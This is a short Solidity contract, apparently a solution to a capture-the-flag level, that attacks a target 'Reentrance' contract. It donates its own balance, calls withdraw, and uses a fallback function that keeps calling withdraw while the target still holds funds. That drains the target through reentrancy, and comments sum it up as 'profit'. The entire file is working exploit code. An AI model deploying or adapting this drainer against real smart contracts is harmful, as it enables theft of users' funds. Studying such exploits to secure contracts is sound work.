// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }
    // make a donation then immedietly withdraw
    // create a fallback that recursively withdraws
    // profit
    function hackContract() external {
        Reentrance ogContract = Reentrance(contractAddress);
        ogContract.donate{value: address(this).balance}(address(this));
        ogContract.withdraw();
    }

    fallback() external payable {
        Reentrance ogContract = Reentrance(contractAddress);
        if (contractAddress.balance > 0) {
            ogContract.withdraw();
        }
    }
}
